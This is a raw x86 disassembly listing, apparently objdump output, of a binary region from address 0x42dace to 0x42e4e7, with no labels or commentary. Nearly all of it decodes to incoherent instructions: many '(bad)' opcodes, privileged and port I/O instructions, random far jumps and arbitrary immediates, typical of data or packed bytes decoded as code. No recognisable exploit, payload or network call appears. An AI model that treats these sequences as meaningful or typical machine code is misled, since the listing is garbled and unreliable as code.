  42dace:	xor    DWORD PTR [edx+0x7d13b616],0xde196dd3
  42dad8:	and    eax,0xf609c35e
  42dadd:	xor    eax,0x6c24a85
  42dae2:	(bad)  
  42dae4:	psadbw mm5,mm6
  42dae7:	jle    0x42da88
  42dae9:	sub    al,0x67
  42daeb:	sub    eax,0xb941dd03
  42daf0:	aaa    
  42daf1:	mov    eax,DWORD PTR [ebx+0x11]
  42daf4:	mov    al,ds:0xcc8ad5fe
  42daf9:	(bad)  
  42dafa:	add    eax,0x864c1ac2
  42daff:	push   esp
  42db00:	push   0x9d610bcf
  42db05:	push   cs
  42db06:	fnstcw WORD PTR [edx+0xcde7803]
  42db0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db0d:	add    BYTE PTR [edi+0x68],dl
  42db10:	fsubr  DWORD PTR [edx-0x8]
  42db13:	xchg   ebp,eax
  42db14:	in     eax,dx
  42db15:	int    0x46
  42db17:	xor    ecx,DWORD PTR [ebx+0x7ecf2137]
  42db1d:	daa    
  42db1e:	mov    eax,ds:0x9b08fb13
  42db23:	inc    edi
  42db24:	and    BYTE PTR [ebp+edi*8+0x2c],0x92
  42db29:	aad    0xbb
  42db2b:	jae    0x42db20
  42db2d:	mov    dh,0xba
  42db2f:	push   edx
  42db30:	(bad)  
  42db31:	stos   DWORD PTR es:[edi],eax
  42db32:	adc    DWORD PTR ss:[ebp-0x65],0xc3a2aad3
  42db3a:	mov    edx,0xec25a516
  42db3f:	xchg   ebp,eax
  42db40:	and    eax,0xb4b67fbe
  42db45:	and    BYTE PTR [ebp-0x6d7461cd],al
  42db4b:	fucom  st(4)
  42db4d:	stos   DWORD PTR es:[edi],eax
  42db4e:	invd   
  42db50:	pop    esi
  42db51:	xor    dh,BYTE PTR [edi-0x1a96590b]
  42db57:	shr    BYTE PTR [eax-0x33],1
  42db5a:	shr    BYTE PTR [eax-0x63560656],1
  42db60:	fmul   QWORD PTR [edx+0x19]
  42db63:	aad    0x6f
  42db65:	mov    edi,0x4030e5c2
  42db6a:	popf   
  42db6b:	push   ecx
  42db6c:	pop    ds
  42db6d:	mov    ch,0x0
	...
  42dbd3:	add    BYTE PTR [eax],al
  42dbd5:	add    BYTE PTR [eax-0x2093e086],dh
  42dbdb:	ins    DWORD PTR es:[edi],dx
  42dbdc:	repz (bad) 
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dbd8
  42dbe3:	mov    ebp,esp
  42dbe5:	mov    ah,BYTE PTR [edi-0x16]
  42dbe8:	add    DWORD PTR [eax],eax
  42dbea:	add    BYTE PTR [ecx],al
  42dbec:	add    BYTE PTR [eax],al
  42dbee:	sub    BYTE PTR [edx+esi*4-0x35],0xdb
  42dbf3:	mov    ds:0xfc93ae58,al
  42dbf8:	dec    edx
  42dbf9:	mov    ds:0xc3200e5d,eax
  42dbfe:	jbe    0x42dc4a
  42dc00:	and    cl,ah
  42dc02:	frstor [edx]
  42dc04:	pop    ebp
  42dc05:	and    edi,DWORD PTR [eax+0x3afd54b3]
  42dc0b:	add    BYTE PTR [edx+0x31],bl
  42dc0e:	cmp    DWORD PTR [ecx-0xe6fe5a4],ecx
  42dc14:	jl     0x42dc5d
  42dc16:	fsubr  QWORD PTR [esi-0x4a]
  42dc19:	test   BYTE PTR [eax-0x780e8975],ah
  42dc1f:	push   0x844e95a3
  42dc24:	shl    BYTE PTR [edi+0x58b77e5f],0x96
  42dc2b:	sahf   
  42dc2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc2d:	mov    ds:0x820b618b,eax
  42dc32:	cmc    
  42dc33:	mov    ds:0x7f445c0d,al
  42dc38:	inc    ecx
  42dc39:	test   eax,0xbcdfc536
  42dc3e:	xchg   edx,edi
  42dc40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc41:	bound  ebx,QWORD PTR [esp+eax*8-0x1b]
  42dc45:	xor    bh,dl
  42dc47:	push   ss
  42dc48:	in     al,dx
  42dc49:	fs push ds
  42dc4b:	lahf   
  42dc4c:	or     al,0xd2
  42dc4e:	lods   eax,DWORD PTR ds:[esi]
  42dc4f:	jg     0x42dc3f
  42dc51:	push   esp
  42dc52:	push   edx
  42dc53:	scas   eax,DWORD PTR es:[edi]
  42dc54:	out    dx,eax
  42dc55:	mov    DWORD PTR [edx],ecx
  42dc57:	mov    bl,0xeb
  42dc59:	arpl   WORD PTR [edi-0x44412d82],bp
  42dc5f:	xchg   DWORD PTR [ebx-0x56],eax
  42dc62:	push   es
  42dc63:	ldmxcsr DWORD PTR gs:[edi+0x166c596]
  42dc6b:	lds    esp,FWORD PTR ds:0xfbe98f12
  42dc71:	adc    BYTE PTR [ebp-0x203ec4be],0x99
  42dc78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc79:	sti    
  42dc7a:	(bad)  
  42dc7b:	xchg   edx,eax
  42dc7c:	jb     0x42dccf
  42dc7e:	push   ss
  42dc7f:	and    BYTE PTR [ecx+0x31],dh
  42dc82:	test   BYTE PTR [esi-0x65b9e31f],ch
  42dc88:	jne    0x42dc41
  42dc8a:	or     DWORD PTR [esi],edx
  42dc8c:	pop    ebp
  42dc8d:	xor    eax,0x768807aa
  42dc92:	push   esp
  42dc93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc94:	push   0x5d620cde
  42dc99:	jbe    0x42dc53
  42dc9b:	jl     0x42dcae
  42dc9d:	sbb    DWORD PTR [ecx+0xef9a3cf],esp
  42dca3:	cmc    
  42dca4:	scas   al,BYTE PTR es:[edi]
  42dca5:	cmp    ebp,eax
  42dca7:	jb     0x42dc9e
  42dca9:	sbb    ebx,0xb9dc1d89
  42dcaf:	adc    edi,edx
  42dcb1:	(bad)
  42dcb4:	das    
  42dcb5:	cmp    al,0xb5
  42dcb7:	addr16 jmp 0x42dcc4
  42dcba:	outs   dx,DWORD PTR ss:[esi]
  42dcbc:	jmp    0x98ea4d1
  42dcc1:	dec    eax
  42dcc2:	push   edx
  42dcc3:	dec    eax
  42dcc4:	lods   eax,DWORD PTR ds:[esi]
  42dcc5:	mov    ch,BYTE PTR [ecx+0x788aa8a1]
  42dccb:	(bad)  ds:0x8366bf79
  42dcd1:	mov    ecx,0xd01532f7
  42dcd6:	mov    edi,0xeacdbe02
  42dcdb:	dec    eax
  42dcdc:	xchg   ebp,eax
  42dcdd:	inc    ebp
  42dcde:	push   esp
  42dcdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dce0:	adc    al,0x97
  42dce2:	pop    es
  42dce3:	push   esi
  42dce4:	ss push ecx
  42dce6:	lock inc esp
  42dce8:	(bad)  
  42dce9:	xor    DWORD PTR [ebx],esp
  42dceb:	mov    edx,0xa1b9
	...
  42dd54:	add    BYTE PTR [eax],al
  42dd56:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	jecxz  0x42ddb5
  42dd64:	push   cs
  42dd65:	and    DWORD PTR [edi-0x15],esp
  42dd68:	add    DWORD PTR [eax],eax
  42dd6a:	add    BYTE PTR [ecx],al
  42dd6c:	add    BYTE PTR [eax],al
  42dd6e:	jp     0x42dd1b
  42dd70:	retf   0x70c2
  42dd73:	sbb    DWORD PTR [ebx+eax*8+0x402202e0],esi
  42dd7a:	xchg   edx,eax
  42dd7b:	inc    esp
  42dd7c:	adc    eax,0x3fce46fc
  42dd81:	scas   eax,DWORD PTR es:[edi]
  42dd82:	in     al,0xa7
  42dd84:	xchg   BYTE PTR [ebp+eiz*2+0x32],cl
  42dd88:	jmp    0x9a33:0x6a727da4
  42dd8f:	mov    ebx,0xb25e35db
  42dd94:	repnz lock imul edi,DWORD PTR [ebx-0x6ba6b207],0x7ee3d408
  42dda0:	xchg   esp,eax
  42dda1:	ins    DWORD PTR es:[edi],dx
  42dda2:	out    dx,al
  42dda3:	inc    eax
  42dda4:	jno    0x42dd58
  42dda6:	sbb    eax,0x48ccfd3c
  42ddab:	js     0x42dd8b
  42ddad:	out    dx,al
  42ddae:	clc    
  42ddaf:	xchg   esp,eax
  42ddb0:	add    eax,DWORD PTR [eax]
  42ddb2:	xchg   edi,eax
  42ddb3:	dec    ecx
  42ddb4:	jge    0x42dd8a
  42ddb6:	jg     0x42ddb4
  42ddb8:	aam    0x23
  42ddba:	std    
  42ddbb:	aad    0x5
  42ddbd:	xor    edx,edi
  42ddbf:	fcompp 
  42ddc1:	cmp    dh,dh
  42ddc3:	mov    ah,0xcb
  42ddc5:	mov    eax,0xf25cc909
  42ddca:	jp     0x42de11
  42ddcc:	add    ch,BYTE PTR [edi]
  42ddce:	jge    0x42dda1
  42ddd0:	mov    ah,BYTE PTR [ecx-0x6d]
  42ddd3:	popf   
  42ddd4:	cdq    
  42ddd5:	lahf   
  42ddd6:	sti    
  42ddd7:	sahf   
  42ddd8:	sbb    eax,0xe1fe4cc4
  42dddd:	cmp    DWORD PTR [ebx-0x1312db2c],eax
  42dde3:	sub    ecx,ebp
  42dde5:	jb     0x42de51
  42dde7:	pop    eax
  42dde8:	test   DWORD PTR [ecx-0x1a],esp
  42ddeb:	test   eax,0xa1230c93
  42ddf0:	in     eax,dx
  42ddf1:	hlt    
  42ddf2:	xchg   BYTE PTR [edx+eiz*1+0x4f],bh
  42ddf6:	jp     0x42dda1
  42ddf8:	addr16 pop ds
  42ddfa:	jno    0x42de42
  42ddfc:	arpl   WORD PTR [ebx],cx
  42ddfe:	pop    esi
  42ddff:	lds    esi,FWORD PTR [edi]
  42de01:	inc    esp
  42de02:	inc    esp
  42de03:	aas    
  42de04:	fild   QWORD PTR [ebx]
  42de06:	ja     0x42ddff
  42de08:	les    eax,FWORD PTR gs:[esi+0x4b29d15d]
  42de0f:	pop    ebp
  42de10:	and    edx,DWORD PTR [edx+0x585cbc7a]
  42de16:	mov    esp,DWORD PTR [ebx]
  42de18:	popf   
  42de19:	dec    ebp
  42de1a:	inc    edi
  42de1b:	or     eax,0xe6a14e93
  42de20:	mov    DWORD PTR ds:[edx+0x45e16dd3],esi
  42de27:	sub    cl,dl
  42de29:	ins    DWORD PTR es:[edi],dx
  42de2a:	cli    
  42de2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de2c:	in     al,0xe3
  42de2e:	xor    eax,0x9329ef5d
  42de33:	mov    edx,0xf09c99c
  42de38:	push   ebp
  42de39:	lea    esi,[edx-0xc]
  42de3c:	or     eax,0x2b1bac4
  42de41:	mov    bl,0x89
  42de43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de44:	sti    
  42de45:	repz sub ah,BYTE PTR [esi]
  42de48:	pop    es
  42de49:	cmp    eax,0x498a1952
  42de4e:	hlt    
  42de4f:	jge    0x42ddfe
  42de51:	add    eax,0x3f7799ea
  42de56:	cld    
  42de57:	fild   DWORD PTR [eax-0x75]
  42de5a:	aas    
  42de5b:	mov    esi,0x6775aedd
  42de60:	icebp  
  42de61:	inc    ebp
  42de62:	pop    esp
  42de63:	imul   eax,DWORD PTR [edx-0x33cc968],0x490ab284
  42de6d:	icebp  
	...
  42ded6:	out    0x82,al
  42ded8:	lods   eax,DWORD PTR ds:[esi]
  42ded9:	xor    ebp,ebp
  42dedb:	aas    
  42dedc:	(bad)  
  42dedd:	xlat   BYTE PTR ds:[ebx]
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	call   DWORD PTR [eax]
  42dee4:	adc    al,0x2b
  42dee6:	addr16 in al,dx
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	leave  
  42deef:	je     0x42df1c
  42def1:	pop    esi
  42def2:	pop    ecx
  42def3:	mov    ecx,0xf3b84f8b
  42def8:	push   cs
  42def9:	add    dh,BYTE PTR [edi+edx*4]
  42defc:	shl    DWORD PTR ds:0x6d641bcd,cl
  42df02:	inc    esp
  42df03:	lods   eax,DWORD PTR ds:[esi]
  42df04:	xchg   edx,eax
  42df05:	push   ss
  42df06:	sub    eax,0x183d3639
  42df0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df0c:	(bad)  
  42df0f:	xor    ebx,DWORD PTR [ebp-0xd]
  42df12:	dec    ecx
  42df13:	mov    cl,0x41
  42df15:	sub    esp,DWORD PTR [edx-0x45144a65]
  42df1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df1c:	sub    DWORD PTR [eax+0x1b],ebx
  42df1f:	arpl   WORD PTR [eax+0x6],si
  42df22:	sbb    ebp,DWORD PTR [ebp+ebp*8-0x5f]
  42df26:	test   eax,0xb123a62
  42df2b:	or     eax,0x8e448d21
  42df30:	add    BYTE PTR [ebx],cl
  42df32:	(bad)  
  42df33:	cmc    
  42df34:	inc    eax
  42df35:	or     DWORD PTR [esi-0x2dc04449],ecx
  42df3b:	rol    dl,0x9c
  42df3e:	cwde   
  42df3f:	cld    
  42df40:	aad    0xb5
  42df42:	jg     0x42dfbc
  42df44:	xchg   DWORD PTR [ebx+0x2b5d92e2],ecx
  42df4a:	aaa    
  42df4b:	ds push es
  42df4d:	sub    al,0xe6
  42df4f:	lea    ebp,[esi+0x47]
  42df52:	sub    al,0x7f
  42df54:	sbb    DWORD PTR ds:0xf12cf3b4,eax
  42df5a:	xchg   edx,eax
  42df5b:	push   0xdaa7b226
  42df60:	arpl   WORD PTR [ebx-0x72328d6],bp
  42df66:	push   edx
  42df67:	inc    eax
  42df68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df69:	mov    cl,0xaf
  42df6b:	dec    ebp
  42df6c:	loop   0x42dfb1
  42df6e:	ss ret 0xcd95
  42df72:	push   eax
  42df73:	jnp    0x42df3d
  42df75:	test   al,0xa2
  42df77:	dec    DWORD PTR [eax+0x5d]
  42df7a:	mov    ss:0x407776c,al
  42df80:	pop    esp
  42df81:	cdq    
  42df82:	jge    0x42dfaa
  42df84:	sar    DWORD PTR [ebp-0x6179ccbd],0xe0
  42df8b:	inc    ebx
  42df8c:	icebp  
  42df8d:	jb     0x42df8b
  42df8f:	push   esi
  42df90:	loope  0x42df25
  42df92:	test   BYTE PTR [ecx-0x25860d35],bl
  42df98:	jnp    0x42df24
  42df9a:	lock dec BYTE PTR [ebx-0x29261139]
  42dfa1:	xchg   esp,eax
  42dfa2:	mov    ah,0x6b
  42dfa4:	cmp    DWORD PTR [edi],esp
  42dfa6:	jnp    0x42df42
  42dfa8:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dfaa:	sahf   
  42dfab:	jnp    0x42df5f
  42dfad:	out    dx,al
  42dfae:	add    dl,al
  42dfb0:	loop   0x42df34
  42dfb2:	sahf   
  42dfb3:	(bad)  
  42dfb4:	dec    ecx
  42dfb5:	inc    edi
  42dfb6:	sub    al,0x1c
  42dfb8:	cmp    al,0xda
  42dfba:	in     al,dx
  42dfbb:	test   DWORD PTR [edx+0x1189e22d],ebx
  42dfc1:	and    esi,DWORD PTR [ecx+ebx*1+0x5c]
  42dfc5:	xor    ah,BYTE PTR [edi-0x4e9d99ac]
  42dfcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfcc:	test   ax,0xd442
  42dfd0:	and    WORD PTR [ebp+0x20],bx
  42dfd4:	shl    BYTE PTR [edi+edx*2+0x39786ec5],1
  42dfdb:	das    
  42dfdc:	repnz add dl,cl
  42dfdf:	ja     0x42e026
  42dfe1:	lea    eax,[edi+0x5]
  42dfe4:	push   cs
  42dfe5:	scas   al,BYTE PTR es:[edi]
  42dfe6:	sbb    BYTE PTR [ecx-0x9],bh
  42dfe9:	add    DWORD PTR [eax+0x2a851f],0x0
	...
  42e053:	add    BYTE PTR [eax],al
  42e055:	add    BYTE PTR [edx],al
  42e057:	(bad)  
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x41]
  42e063:	fcomp  QWORD PTR [edx]
  42e065:	sbb    esp,DWORD PTR [edi-0x13]
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	cmp    DWORD PTR [eax-0x30],ebp
  42e071:	mov    ds:0xa1d68616,al
  42e076:	stos   DWORD PTR es:[edi],eax
  42e077:	sbb    esp,DWORD PTR [eax-0x7c]
  42e07a:	retf   
  42e07b:	and    dh,BYTE PTR [ecx+eax*4]
  42e07e:	push   ecx
  42e07f:	jae    0x42e00a
  42e081:	call   0xba52:0x99a0446d
  42e088:	ror    BYTE PTR [eax-0x1f59183c],cl
  42e08e:	loopne 0x42e0f4
  42e090:	jbe    0x42e0ca
  42e092:	mov    cl,BYTE PTR [ebp+0xf089301]
  42e098:	add    esp,DWORD PTR [ebp+0x62]
  42e09b:	dec    ebp
  42e09c:	mov    dh,0x69
  42e09e:	sbb    al,0x36
  42e0a0:	and    dl,BYTE PTR [edi-0x776d308a]
  42e0a6:	arpl   WORD PTR [esi+ebx*8],si
  42e0a9:	sbb    eax,0xe80ece06
  42e0ae:	nop
  42e0af:	xor    eax,0xc3b8df56
  42e0b4:	mov    esi,0x7a537c06
  42e0b9:	les    ebx,FWORD PTR [edx]
  42e0bb:	dec    eax
  42e0bc:	mov    ecx,DWORD PTR [ecx]
  42e0be:	call   0x9bef754b
  42e0c3:	mov    bl,0x30
  42e0c5:	sbb    DWORD PTR [esp+edx*8],edi
  42e0c8:	mov    esi,0xd24cc1b4
  42e0cd:	add    al,0xf2
  42e0cf:	sti    
  42e0d0:	imul   edi,DWORD PTR [edi],0x70
  42e0d3:	pop    eax
  42e0d4:	das    
  42e0d5:	pusha  
  42e0d6:	inc    eax
  42e0d7:	jmp    0x7d55:0x3b9277f4
  42e0de:	sub    al,al
  42e0e0:	das    
  42e0e1:	js     0x42e083
  42e0e3:	xchg   esi,eax
  42e0e4:	xchg   ebp,eax
  42e0e5:	fistp  DWORD PTR [esi-0x167308f8]
  42e0eb:	add    eax,0xf0474c58
  42e0f0:	cli    
  42e0f1:	add    eax,DWORD PTR [ecx+0x2b]
  42e0f4:	pop    ebp
  42e0f5:	pusha  
  42e0f6:	sbb    BYTE PTR [esi],al
  42e0f8:	pop    ecx
  42e0f9:	jge    0x42e155
  42e0fb:	mov    fs,WORD PTR [edi-0x1ceff57b]
  42e101:	ret    0xa133
  42e104:	cmc    
  42e105:	push   ss
  42e106:	out    0x52,al
  42e108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e109:	retf   0x36a6
  42e10c:	sbb    bl,al
  42e10e:	pusha  
  42e10f:	sbb    eax,0x29a7951f
  42e114:	sub    DWORD PTR [ecx+edx*8+0x23],edx
  42e118:	xor    eax,0xa07eb48d
  42e11d:	pop    ebx
  42e11e:	into   
  42e11f:	sub    DWORD PTR [ebp-0x6c],ecx
  42e122:	mov    ecx,0xa50dbc66
  42e127:	mov    edx,0xa504c669
  42e12c:	jnp    0x42e0e2
  42e12e:	popf   
  42e12f:	(bad)  
  42e130:	mov    al,ds:0x77e2861
  42e135:	inc    esp
  42e136:	mov    BYTE PTR [ebx+0x70],ch
  42e139:	ror    BYTE PTR [edi+0x79],cl
  42e13c:	jp     0x42e147
  42e13e:	cmc    
  42e13f:	cmc    
  42e140:	sti    
  42e141:	clc    
  42e142:	xchg   esp,eax
  42e143:	frstor [ebx-0x4831f5a4]
  42e149:	mov    ebp,DWORD PTR [edx-0x11]
  42e14c:	mov    bh,0x5f
  42e14e:	jmp    0xeb700ea3
  42e153:	add    DWORD PTR [ecx+0x37],eax
  42e156:	mov    esp,0xd3be5949
  42e15b:	lea    edx,[edx+eax*8-0x6b6cdfd8]
  42e162:	push   eax
  42e163:	adc    edi,0xffffff94
  42e166:	aam    0xa6
  42e168:	int    0xcc
  42e16a:	rcr    DWORD PTR [ebp+0x4bc5],0x0
	...
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	loopne 0x42e198
  42e1e4:	(bad)  
  42e1e6:	addr16 out dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	in     al,0x79
  42e1f0:	sti    
  42e1f1:	mov    ds:0xe8c00b30,eax
  42e1f6:	and    BYTE PTR [edx+0x7c],bl
  42e1f9:	sub    eax,0x76f22074
  42e1fe:	fisubr DWORD PTR [ebx]
  42e200:	push   edx
  42e201:	mov    bl,0xcc
  42e203:	xor    ebx,ebp
  42e205:	sub    DWORD PTR [edi],esp
  42e207:	jle    0x42e26c
  42e209:	adc    eax,0x65ff77a5
  42e20e:	or     eax,0xeac58050
  42e213:	add    eax,0x444b48df
  42e218:	jno    0x42e215
  42e21a:	jmp    0x6479:0x10c2bf9e
  42e221:	push   edi
  42e222:	xor    al,0x87
  42e224:	or     al,0xcf
  42e226:	stos   BYTE PTR es:[edi],al
  42e227:	jg     0x42e1c6
  42e229:	pushf  
  42e22a:	mov    dl,0xb0
  42e22c:	(bad)  
  42e22d:	jmp    0x42e1e6
  42e22f:	outs   dx,BYTE PTR ds:[esi]
  42e230:	scas   al,BYTE PTR es:[edi]
  42e231:	std    
  42e232:	jmp    FWORD PTR [esi]
  42e234:	push   edi
  42e235:	xchg   esi,eax
  42e236:	bnd jl 0x42e22a
  42e239:	test   al,0xfa
  42e23b:	jl     0x42e1f9
  42e23d:	or     DWORD PTR [esi],esp
  42e23f:	pushf  
  42e240:	dec    BYTE PTR [eax+0x78f02120]
  42e246:	mov    ch,0x66
  42e248:	out    dx,al
  42e249:	es sbb eax,0x5f480705
  42e24f:	rcr    BYTE PTR [ecx],cl
  42e251:	jo     0x42e2bd
  42e253:	inc    edi
  42e254:	cmp    BYTE PTR [eax+0x5dec820a],ch
  42e25a:	xchg   edx,ebp
  42e25c:	loop   0x42e212
  42e25e:	out    0x1d,eax
  42e260:	cmp    esp,DWORD PTR [eax-0x1]
  42e263:	mov    al,0x6c
  42e265:	sahf   
  42e266:	push   esi
  42e267:	jge    0x42e2c7
  42e269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e26a:	lods   eax,DWORD PTR ds:[esi]
  42e26b:	push   edi
  42e26c:	leave  
  42e26d:	pop    ebp
  42e26e:	fldcw  WORD PTR [ebp-0x4c]
  42e271:	(bad)  
  42e272:	lahf   
  42e273:	jae    0x42e247
  42e275:	mov    edi,ecx
  42e277:	jp     0x42e282
  42e279:	push   ds
  42e27a:	or     eax,0x3124fccd
  42e27f:	push   ebp
  42e280:	push   eax
  42e281:	cmp    bl,BYTE PTR [ecx+esi*2]
  42e284:	mov    ecx,0xf6617c74
  42e289:	in     al,dx
  42e28a:	fbld   TBYTE PTR [ecx+esi*4+0x25]
  42e28e:	stos   BYTE PTR es:[edi],al
  42e28f:	push   esp
  42e290:	in     eax,0x62
  42e292:	mov    cs,ebx
  42e294:	clc    
  42e295:	push   0x5c
  42e297:	jbe    0x42e2ca
  42e299:	mov    bh,0xb9
  42e29b:	int    0x4d
  42e29d:	and    BYTE PTR [eax-0x40aca7af],dl
  42e2a3:	lds    esi,FWORD PTR [ebx]
  42e2a5:	sbb    al,0x11
  42e2a7:	sub    al,0x3f
  42e2a9:	ror    DWORD PTR [edi+0x65b7855e],0x31
  42e2b0:	in     eax,dx
  42e2b1:	jg     0x42e2bf
  42e2b3:	xor    DWORD PTR [esi],edx
  42e2b5:	xchg   esi,eax
  42e2b6:	std    
  42e2b7:	ret    
  42e2b8:	in     al,dx
  42e2b9:	repnz sbb BYTE PTR [edx+0x72],ch
  42e2bd:	imul   edi,ebx,0x1e401102
  42e2c3:	adc    eax,0x1e377f06
  42e2c8:	push   edi
  42e2c9:	sub    ebp,ebx
  42e2cb:	sub    dl,BYTE PTR [ecx+ebp*1-0x6144a1d]
  42e2d2:	jne    0x42e265
  42e2d4:	or     al,0x1f
  42e2d6:	stos   BYTE PTR es:[edi],al
  42e2d7:	outs   dx,BYTE PTR ds:[esi]
  42e2d8:	pop    esi
  42e2d9:	inc    ebp
  42e2da:	push   edx
  42e2db:	mov    BYTE PTR [ecx],dh
  42e2dd:	xchg   esi,eax
  42e2de:	mov    bh,0xd3
  42e2e0:	jge    0x42e288
  42e2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e2e3:	pop    edx
  42e2e4:	jle    0x42e2f6
  42e2e6:	imul   eax,edx,0xfffffffd
  42e2e9:	sub    edi,DWORD PTR [esi]
  42e2eb:	addr16 dec edx
  42e2ed:	mov    BYTE PTR [eax],al
	...
  42e353:	add    BYTE PTR [eax],al
  42e355:	add    BYTE PTR [ebp-0x655875c3],ch
  42e35b:	mov    bh,0xad
  42e35d:	aas    
  42e35e:	mov    ebx,0xce199140
  42e363:	data16 (bad) 
  42e365:	mov    cl,0x67
  42e367:	out    dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	jb     0x42e3cb
  42e370:	mov    esi,?
  42e372:	aad    0xbc
  42e374:	push   ebp
  42e375:	cmp    DWORD PTR [ecx-0x7888626d],esp
  42e37b:	ja     0x42e333
  42e37d:	adc    dl,BYTE PTR [ecx]
  42e37f:	pop    es
  42e380:	jmp    0x48aadf51
  42e385:	jecxz  0x42e333
  42e387:	pop    es
  42e388:	mov    eax,ds:0xc417a45f
  42e38d:	xor    cl,BYTE PTR [edx-0x47e35000]
  42e393:	pop    ss
  42e394:	mov    edx,0x69bac4b4
  42e399:	imul   edx,DWORD PTR [esi],0x26
  42e39c:	mov    edi,0x91981d6c
  42e3a1:	and    al,BYTE PTR [esi-0x12]
  42e3a4:	daa    
  42e3a5:	adc    BYTE PTR [edi],0xd4
  42e3a8:	push   ss
  42e3a9:	sbb    ah,ah
  42e3ab:	shl    DWORD PTR [edx],0x42
  42e3ae:	test   al,0xd6
  42e3b0:	sbb    edx,edi
  42e3b2:	xchg   DWORD PTR [edi+0x71cf8e7f],ecx
  42e3b8:	xor    DWORD PTR [edi-0x35ece723],0x278861f6
  42e3c2:	in     eax,dx
  42e3c3:	sub    DWORD PTR [ebx+esi*1-0x19],esi
  42e3c7:	sbb    edi,DWORD PTR [ebx-0xf]
  42e3ca:	cdq    
  42e3cb:	cmp    DWORD PTR [edi],0xffffffdd
  42e3ce:	sbb    al,0xc3
  42e3d0:	xchg   ebx,eax
  42e3d1:	jbe    0x42e394
  42e3d3:	push   0xffffffb5
  42e3d5:	cmp    bh,ch
  42e3d7:	outs   dx,BYTE PTR ds:[esi]
  42e3d8:	cmp    eax,0xd9ec2add
  42e3dd:	leave  
  42e3de:	jb     0x42e3df
  42e3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3e1:	mov    eax,ds
  42e3e3:	in     eax,dx
  42e3e4:	es fucomi st,st(2)
  42e3e7:	pop    esp
  42e3e8:	ins    DWORD PTR es:[edi],dx
  42e3e9:	push   ebx
  42e3ea:	cmp    edx,DWORD PTR [eax]
  42e3ec:	fidivr WORD PTR [esp+eax*1+0x68]
  42e3f0:	pop    ebp
  42e3f1:	test   DWORD PTR [edx+0x11],ebp
  42e3f4:	ret    
  42e3f5:	stos   WORD PTR es:[edi],ax
  42e3f7:	sub    al,0x35
  42e3f9:	xchg   ebx,eax
  42e3fa:	and    ebp,esp
  42e3fc:	js     0x42e467
  42e3fe:	jg     0x42e3d2
  42e400:	mov    ch,0x52
  42e402:	xchg   ecx,eax
  42e403:	neg    DWORD PTR [eax]
  42e405:	or     eax,0x9b390cf3
  42e40a:	cmc    
  42e40b:	inc    edi
  42e40c:	mov    ds:0x77058437,al
  42e411:	xor    eax,0x2effad4d
  42e416:	test   DWORD PTR [edi-0x37],edx
  42e419:	loopne 0x42e426
  42e41b:	fnstcw WORD PTR [eax+0x53]
  42e41e:	stos   DWORD PTR es:[edi],eax
  42e41f:	gs mov ecx,0x728b3bdc
  42e425:	sbb    BYTE PTR [edi+0x25],0x46
  42e429:	mov    edx,0x623f4563
  42e42e:	pop    esp
  42e42f:	mov    ds:0xa92e8d9a,al
  42e434:	mov    ecx,ecx
  42e436:	push   es
  42e437:	jp     0x42e47d
  42e439:	repnz sub DWORD PTR [edx+0x7c28086d],0x2e971bd2
  42e444:	adc    DWORD PTR [esi-0x1c],0xe
  42e448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e449:	mov    eax,ds:0x84009a79
  42e44e:	adc    eax,0x9748c546
  42e453:	and    al,0x2e
  42e455:	sub    al,0x84
  42e457:	adc    DWORD PTR [ebx+ecx*4-0x75eec53a],edi
  42e45e:	ud0    ebp,DWORD PTR [eax]
  42e461:	inc    edx
  42e462:	cmp    esi,DWORD PTR [esi-0x2b]
  42e465:	aam    0xd7
  42e467:	pop    ds
  42e468:	inc    esp
  42e469:	xchg   DWORD PTR [edx+0x8b0523],edx
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	nop
  42e4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4e4:	inc    ecx
  42e4e5:	mov    ch,0x67
  42e4e7:	lock add DWORD PTR [eax],eax
